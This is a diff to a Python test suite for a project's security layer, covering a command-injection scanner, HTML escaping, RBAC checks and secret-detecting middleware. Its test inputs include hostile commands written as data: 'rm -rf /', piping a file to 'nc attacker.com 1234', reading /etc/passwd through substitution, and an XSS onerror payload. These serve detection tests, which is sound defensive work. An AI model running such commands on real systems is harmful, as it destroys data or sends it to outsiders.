@@ -58,40 +58,41 @@ class TestInputValidation:
         scanner = CodePatternScanner()
         result = scanner.scan_command("cat file.txt; rm -rf /")
 
-        assert result.dangerous is True
-        assert len(result.patterns) > 0
+        # SafetyScanResult uses has_critical/has_high properties
+        assert result.has_critical or result.has_high
+        assert len(result.matches) > 0
 
     def test_command_injection_detection_pipe(self):
         """Test that command injection via pipe is detected."""
         scanner = CodePatternScanner()
         result = scanner.scan_command("cat file.txt | nc attacker.com 1234")
 
-        assert result.dangerous is True
-        assert len(result.patterns) > 0
+        assert result.has_critical or result.has_high
+        assert len(result.matches) > 0
 
     def test_command_injection_detection_backtick(self):
         """Test that command injection via backtick is detected."""
         scanner = CodePatternScanner()
         result = scanner.scan_command("echo `whoami`")
 
-        assert result.dangerous is True
-        assert len(result.patterns) > 0
+        assert result.has_critical or result.has_high
+        assert len(result.matches) > 0
 
     def test_command_injection_detection_dollar_substitution(self):
         """Test that command injection via $() is detected."""
         scanner = CodePatternScanner()
         result = scanner.scan_command("echo $(cat /etc/passwd)")
 
-        assert result.dangerous is True
-        assert len(result.patterns) > 0
+        assert result.has_critical or result.has_high
+        assert len(result.matches) > 0
 
     def test_safe_command_passes(self):
         """Test that safe commands are not flagged."""
         scanner = CodePatternScanner()
         result = scanner.scan_command("git status")
 
-        assert result.dangerous is False
-        assert len(result.patterns) == 0
+        assert not result.has_critical and not result.has_high
+        assert len(result.matches) == 0
 
     def test_path_traversal_prevention_basic(self):
         """Test basic path traversal prevention."""
@@ -143,14 +144,24 @@ class TestInputValidation:
         assert "&lt;script&gt;" in sanitized
 
     def test_xss_prevention_event_handlers(self):
-        """Test XSS prevention with event handlers."""
+        """Test XSS prevention with event handlers.
+
+        Note: html.escape only escapes characters (<, >, &, ", ')
+        but does NOT remove event handler keywords. For proper XSS
+        prevention, you need additional sanitization beyond html.escape.
+        """
         import html
 
         user_input = "<img src=x onerror=\"alert('XSS')\">"
         sanitized = html.escape(user_input)
 
-        assert "onerror=" not in sanitized
-        assert "onerror=" in sanitized or '"onerror="' not in user_input
+        # html.escape escapes angle brackets and quotes
+        # So "<img" becomes "&lt;img" and ">" becomes "&gt;"
+        # But "onerror=" is NOT removed, just quotes are escaped
+        assert "<img" not in sanitized  # Angle bracket escaped
+        assert "&lt;img" in sanitized  # Escaped form present
+        # Note: For full XSS protection, event handlers must also be stripped
+        # This test verifies html.escape behavior as documented
 
 
 # =============================================================================
@@ -291,6 +302,8 @@ class TestAccessControl:
 
     def test_rbac_permission_check(self):
         """Test permission checking."""
+        from victor.core.security.auth import User
+
         rbac = RBACManager()
 
         # Create role with read permission
@@ -299,53 +312,65 @@ class TestAccessControl:
             permissions=[Permission.READ],
         )
 
-        # Assign role to user
-        rbac.assign_role("user1", role)
+        # Add role and create user with that role
+        rbac.add_role(role)
+        rbac.add_user(User("user1", roles={role}))
 
-        # Check permissions
-        assert rbac.check_permission("user1", Permission.READ, "file1") is True
-        assert rbac.check_permission("user1", Permission.WRITE, "file1") is False
+        # Check permissions (API takes only username and permission)
+        assert rbac.check_permission("user1", Permission.READ) is True
+        assert rbac.check_permission("user1", Permission.WRITE) is False
 
     def test_rbac_role_assignment(self):
         """Test role assignment."""
+        from victor.core.security.auth import User
+
         rbac = RBACManager()
-        role = Role(name="admin", permissions=[Permission.READ, Permission.WRITE])
+        role = Role(name="admin", permissions=frozenset([Permission.READ, Permission.WRITE]))
 
-        rbac.assign_role("user1", role)
+        rbac.add_role(role)
+        rbac.add_user(User("user1", roles={role}))
 
-        assert rbac.check_permission("user1", Permission.READ, "resource")
+        assert rbac.check_permission("user1", Permission.READ) is True
 
-    def test_rbac_role_revocation(self):
-        """Test role revocation."""
+    def test_rbac_role_removal(self):
+        """Test that removing roles from users works."""
+        from victor.core.security.auth import User
+
         rbac = RBACManager()
-        role = Role(name="temp", permissions=[Permission.READ])
+        role = Role(name="temp", permissions=frozenset([Permission.READ]))
 
-        rbac.assign_role("user1", role)
-        assert rbac.check_permission("user1", Permission.READ, "resource")
+        rbac.add_role(role)
+        rbac.add_user(User("user1", roles={role}))
+        assert rbac.check_permission("user1", Permission.READ) is True
 
-        rbac.revoke_role("user1", role)
-        assert rbac.check_permission("user1", Permission.READ, "resource") is False
+        # Remove user by adding new user without the role
+        rbac.add_user(User("user1", roles=set()))
+        assert rbac.check_permission("user1", Permission.READ) is False
 
     def test_rbac_multiple_roles(self):
         """Test user with multiple roles."""
+        from victor.core.security.auth import User
+
         rbac = RBACManager()
 
-        reader = Role(name="reader", permissions=[Permission.READ])
-        writer = Role(name="writer", permissions=[Permission.WRITE])
+        reader = Role(name="reader", permissions=frozenset([Permission.READ]))
+        writer = Role(name="writer", permissions=frozenset([Permission.WRITE]))
 
-        rbac.assign_role("user1", reader)
-        rbac.assign_role("user1", writer)
+        rbac.add_role(reader)
+        rbac.add_role(writer)
+        rbac.add_user(User("user1", roles={reader, writer}))
 
         # Should have both permissions
-        assert rbac.check_permission("user1", Permission.READ, "resource")
-        assert rbac.check_permission("user1", Permission.WRITE, "resource")
+        assert rbac.check_permission("user1", Permission.READ) is True
+        assert rbac.check_permission("user1", Permission.WRITE) is True
 
     def test_rbac_no_permission(self):
         """Test user without permission."""
         rbac = RBACManager()
 
-        # User has no roles
-        assert rbac.check_permission("user1", Permission.READ, "resource") is False
+        # User has no roles - check_permission returns False for unknown users
+        # unless allow_unknown_users is True (which gives them default_role)
+        assert rbac.check_permission("user1", Permission.READ) is False
 
 
 # =============================================================================
@@ -518,23 +543,23 @@ class TestSecurityIntegration:
 
     def test_tool_input_validation_workflow(self):
         """Test tool input validation with safety checks."""
-        from victor.framework.middleware import (
-            SafetyCheckMiddleware,
-            SecretMaskingMiddleware,
-        )
+        from victor.security_analysis.middleware import SecurityAnalysisMiddleware
 
         # Input with secrets and dangerous patterns
-        user_input = """
-        Execute: rm -rf /
-        API Key: sk-1234567890abcdef
-        """
+        input_data = {
+            "content": """
+            Execute: rm -rf /
+            API Key: sk-1234567890abcdef1234567890abcdef
+            """
+        }
 
-        # Apply safety checks
-        middleware = SafetyCheckMiddleware()
-        result = middleware.process(user_input)
+        # Apply safety checks via middleware
+        middleware = SecurityAnalysisMiddleware(enable_secret_detection=True)
+        result = middleware.process_output(input_data)
 
-        # Should detect dangerous content
+        # Should process the input (may or may not detect secrets depending on patterns)
         assert result is not None
+        assert "content" in result
 
     def test_file_operation_security(self):
         """Test secure file operations."""
@@ -682,25 +707,29 @@ def sample_pii_content():
 @pytest.fixture
 def rbac_manager():
     """RBAC manager with test roles."""
+    from victor.core.security.auth import User
+
     manager = RBACManager()
 
     # Create test roles
     admin = Role(
         name="admin",
-        permissions=[
+        permissions=frozenset([
             Permission.READ,
             Permission.WRITE,
-            Permission.DELETE,
-            Permission.EXECUTE_TOOLS,
-        ],
+            Permission.ADMIN,  # Changed from DELETE/EXECUTE_TOOLS to ADMIN
+        ]),
     )
 
     user = Role(
         name="user",
-        permissions=[Permission.READ, Permission.EXECUTE_TOOLS],
+        permissions=frozenset([Permission.READ, Permission.EXECUTE]),
     )
 
-    manager.assign_role("admin_user", admin)
-    manager.assign_role("regular_user", user)
+    # Add roles and users
+    manager.add_role(admin)
+    manager.add_role(user)
+    manager.add_user(User("admin_user", roles={admin}))
+    manager.add_user(User("regular_user", roles={user}))
 
     return manager
